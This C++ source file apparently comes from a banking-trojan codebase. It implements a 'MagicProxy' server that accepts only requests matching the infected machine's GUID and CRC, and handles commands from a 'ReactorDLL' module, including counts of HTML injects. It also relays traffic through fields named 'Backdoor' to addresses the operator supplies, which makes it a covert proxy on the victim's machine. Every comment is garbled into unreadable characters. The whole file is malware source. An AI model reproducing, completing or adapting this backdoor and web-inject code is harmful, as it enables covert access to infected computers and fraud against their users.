//---------------------------------------------------------------------------

#pragma hdrstop

#include "GetApi.h"
#include "Memory.h"
#include "MagicProxy.h"

//---------------------------------------------------------------------------
#pragma package(smart_init)


//*****************************************************************************
//                                TReactorCommandService
//*****************************************************************************


//-----------------------------------------------------------
//  ProcessCommand
//  ������� ������������ ������� ���������� �� ����������
//  ReactorDLL
//-----------------------------------------------------------
bool TReactorCommandService::ProcessCommand(BYTE CommandID,
											const string& CommandData,
											string& ResponseData)
{
	switch (CommandID)
	{

		/* �������� ����������������� ������� */
		case REACTOR_COMMAND_PING: return true;

		/* ����� ���������� �������� ��� URL */
		case REACTOR_COMMAND_GET_HTMLINJECTS_COUNT:
			return GetHTMLInjectsCount(CommandData, ResponseData);

		/* ������� �� ���������� �������� ��� URL */
		case REACTOR_COMMAND_EXECUTE_HTMLINJECTS: return false;


	}
	return false;
}



//-----------------------------------------------------------
//  GetHTMLInjectsCount
//  ������� ���������� ���������� �������� ��� ���������� URL
//-----------------------------------------------------------
bool TReactorCommandService::GetHTMLInjectsCount(const string& URL, string& Response)
{
	return false;
}






//*****************************************************************************
//                              TMagicProxy
//*****************************************************************************


TMagicProxy::TMagicProxy(const char* IPAddress, WORD Port)
	: TTCPServer(IPAddress, Port)
{
	FRequests = new TProxyRequestCollection();
	// ������ ������� ������
	FCommandService = new TReactorCommandService();
}


TMagicProxy::~TMagicProxy()
{
	delete FCommandService;
	delete FRequests;
}


//-----------------------------------------------------------
//  GetProxyService
//  ������� ���������� ����� ������� �� ��� ��������������
//-----------------------------------------------------------
TProxyService* TMagicProxy::GetProxyService(BYTE ServiceID)
{
	if (ServiceID == REACTOR_COMMAND_SERVICE)
		return FCommandService;

	return NULL;
}


//-----------------------------------------------------------
//  ValidateRequest
//  ������� ��������� ������ ����������� ���������� ��������
//  ���������� ������ ���� ������ ��� ��������� ReactorDLL
//-----------------------------------------------------------
bool TMagicProxy::ValidateRequest(PROXY_MAGIC_BUFFER *Request)
{
	GUID expectedGUID = Reactor_MachineGUID();
	if (expectedGUID != Request->Auth.MachineUnique)
		return false;

	DWORD crc = (DWORD)pRtlComputeCrc32(0, (const PBYTE)&Request->Auth.MachineUnique,
										sizeof(Request->Auth.MachineUnique));

	crc *= crc * crc;
	return crc == Request->Auth.MachineUniqueCrc32pow3;
}




//-----------------------------------------------------------
//  DoProcessConnection
//  � ����������� ���������
//-----------------------------------------------------------
void TMagicProxy::DoProcessClient(TTCPClient* Client)
{
	TReactorRequest Request;
	ClearStruct(Request);

	bool Valid = Client->ReceiveData(&Request, sizeof(Request));

	if (!Valid) return;
		

	if (ValidateRequest(&Request))
	{
		DWORD  ResponseCode;
		string ResponseText;

		// ������������ ������
		ProcessRequest(Client, &Request, ResponseCode, ResponseText);

        // ���������� ����� �������
		MAGIC_RESPONSE_HEADER Response;
		Response.ResponseCode       = ResponseCode;
		Response.ResponseBodyLength = ResponseText.Length();

		// ���������� ���������
		Valid = Client->SendData((PCHAR)&Response, sizeof(Response));

		// ���������� ����
		if (Valid && ResponseText.Length())
		{
        	Client->SendData(ResponseText.t_str(), ResponseText.Length());
        }

    }
}


//-----------------------------------------------------------
//  ProcessRequest
//  ������� ������������ ������ � ���������� ����������
// ���  � ����� ������
//-----------------------------------------------------------
void TMagicProxy::ProcessRequest(TTCPClient* Client, PReactorRequest Request, DWORD &ResponseCode, string &ResponseText)
{
	ResponseCode = REACTOR_RESPONSE_NONE;
	ResponseText.Clear();

	// ������������ ����� � ������ �������
	if (Request->Backdoor.AssociatePort == AssocPort_SvcCall)
	{
		bool Valid = true;

		// ������ ������ �������
		string CommandData;
		if (Request->Backdoor.SizeOfMagicBody)
		{
			CommandData.SetLength(Request->Backdoor.SizeOfMagicBody);
			Valid = Client->ReceiveData(CommandData.t_str(),
										Request->Backdoor.SizeOfMagicBody);
		}

		if (Valid)
		{
			
			TProxyService* Service = GetProxyService(Request->Backdoor.ServiceId);

			Valid = Service != NULL;
			if (Valid)
			{
				// �������� ���������� �������
				Valid = Service->ProcessCommand(Request->Backdoor.CommandId,
												CommandData, ResponseText);
			}
		}

		if (Valid)
			ResponseCode = REACTOR_RESPONSE_OK;
		else
            ResponseCode = REACTOR_RESPONSE_ERROR;

		return;
	}



	// ��������� ����� � ������
	if (FRequests->Find(Request->Backdoor.ClientTCPPort) == NULL)
	{
		ResponseCode = REACTOR_RESPONSE_OK;
        new TProxyRequest(FRequests, *Request);
    }

}




//*****************************************************************************
//                                   TProxyServer
//*****************************************************************************

TProxyServer::TProxyServer(TMagicProxy &ReactorServer, const char* IPAddress, WORD Port)
	: TTCPServer(IPAddress, Port)
{
	FRequests = ReactorServer.FRequests;
}



//-----------------------------------------------------------
//  DoProcessClient
//  ������� ��������� ����������� � ������ �������
//-----------------------------------------------------------
void TProxyServer::DoProcessClient(TTCPClient* Client)
{
	// ���� ������
	TProxyRequest* Request = FRequests->Find(Client->Port());
	if (Request)
	{
		Request->SetOwner(NULL);

		// ��������� ����� ��������� ������ ������
		TTCPClient Target;
		Target.SetNonBlocking(true);
		if (Target.Connect(Request->Address, Request->Port))
		{
			// ��������� ����� �����
        	ProxyLoop(Client, &Target);
        }

		// ������� ������
		delete Request;
    }
		
}


//-----------------------------------------------------------
//  ProxyLoop
//  ������� "�����" ������ �������
//  � ��� �������������� ����, �������� ������ �� ��������
//  � ��������� ������� � ������������� ����������
//-----------------------------------------------------------
void TProxyServer::ProxyLoop(TTCPClient* Client, TTCPClient* Target)
{
	bool CloseConnection = false;

	#ifdef _DEBUG
		// � ������ ������� ��������� �����
		TLock Locker = FRequests->GetLocker();
	#endif
	//--------------------------------------------------------------

	FD_SET ReadFD;
	FD_SET WriteFD;
	timeval Timeout = MakeTimeval(100);

	DWORD   BufSize = 1023;
	TMemory BufMem(BufSize + 1);
	PCHAR   Buf = BufMem.AsStr();

	SOCKET CS = Client->Socket();
    SOCKET TS = Target->Socket();

	int State;
	int Readden;
	int Written;

	#define CHECK_ERROR(ST) if (ST == SOCKET_ERROR) return

	while (true)
	{
		// ������� ���������� ������� � ������

		FD_ZERO(&ReadFD);

		FD_SET(  CS, &ReadFD);
		FD_SET(TS, &ReadFD);

		State = select(0, &ReadFD, 0, 0, &Timeout);
		CHECK_ERROR(State);
		if (State == 0) continue;
			

		if (FD_ISSET(CS, &ReadFD))
		{
			// ������ ������ �� �������
			Readden = recv(CS, Buf, BufSize, 0);
			CHECK_ERROR(Readden);

			if (Readden > 0)
			{
				Written = Target->SendDataEx(Buf, Readden, INFINITE);
				CHECK_ERROR(Written);
				if (Written != Readden) break; // ������ ������
				continue;
            }
		}


		// �������� ������ �� ��������� �������
		if (FD_ISSET(TS, &ReadFD))
		{
			// ������ ������ �� �������
			Readden = recv(TS, Buf, BufSize, 0);
			CHECK_ERROR(Readden);

			if (Readden >= 0)
			{
				Written = Client->SendDataEx(Buf, Readden, INFINITE);
				CHECK_ERROR(Written);
				if (Written != Readden) return; // ������ ������
            }
        }

	}



  /*	while (!CloseConnection)
	{
		// ������� ������ �� ������� ��������� �������
		bool Result1 = TransmitDataBetweenSockets(Client, Target, Buf,
												 CloseConnection, NULL);

		// ������ ������ �� ��������� ������� � ������� �� �������
		bool Result2 = TransmitDataBetweenSockets(Target, Client, Buf,
									   CloseConnection, NULL);
		if (!Result1 && !Result2) break;
	}  */
}


//-----------------------------------------------------------
//  TransmitDataBetweenSockets
//  ������� ������������ ������� ����� ��������
//
//  Source - ����� ��������.
//  Destination - ����� �������
//  Buf - ���� ������ ������
//  Terminate - �������� �������� ��������� ���� ����������.
//              (���������� ���� ��������� � ��.)
//  DataHandler - ���������� ������������ ������
//-----------------------------------------------------------
bool TProxyServer::TransmitDataBetweenSockets(TTCPClient* Source,
					  TTCPClient* Destination, TMemory& Buf,
					  bool &Terminate, LPVOID DataHandler)


{
	int Readden = 0;
	int Written = 0;
	bool Result = true;

	PCHAR ToWrite;
	int   ToWriteSize;

    int TotalWriten = 0;

	do
	{
		Buf.Clear();

		// ������ ������ ������ �� ���������
		Readden = Source->ReceiveEx(Buf.Buf(), Buf.Size() - 1, INFINITE);

		ToWrite = NULL;
		ToWriteSize = 0;

		if (Readden != SOCKET_ERROR)
		{
			ToWrite = Buf.AsStr();
			ToWriteSize = Readden;

			// ������������ ������

			// ���������� ������
			Written = Destination->SendDataEx(ToWrite, ToWriteSize, INFINITE);

			if (Written != ToWriteSize) return false;

			TotalWriten += Written;
		}
	}
	while (ToWriteSize);

	return TotalWriten != 0;
}



//*****************************************************************************
//                        TProxyRequest
//*****************************************************************************


TProxyRequest::TProxyRequest(TProxyRequestCollection* Owner, TReactorRequest &Request)
	: TBotCollectionItem(NULL)
{
	ClientPort   = htons(Request.Backdoor.ClientTCPPort);
	Port         = htons(Request.Backdoor.AssociatePort);
	Address      = Request.Backdoor.AssociateAddr;
	Transparent  = Request.Backdoor.Transparent;

	SetOwner(Owner);
}



//*****************************************************************************
//                        TProxyRequestCollection
//*****************************************************************************

TProxyRequestCollection::TProxyRequestCollection()
	: TBotCollection()
{
    SetThreadSafe();
}



//-----------------------------------------------------------
//  Find
//  ������� ���� ���������� � ������� � ���������� �����������
//-----------------------------------------------------------
TProxyRequest* TProxyRequestCollection::Find(WORD ClientPort)
{
    TProxyRequest* Result = 0;
	Lock();

	for (int i = 0; i < Count(); i++)
	{
		TProxyRequest* Item = (TProxyRequest*)Items(i);

		bool Valid = Item->ClientPort == ClientPort;

		if (Valid)
		{
			Result = Item;
			break;
        }
	}

    Unlock();
	return Result;
}
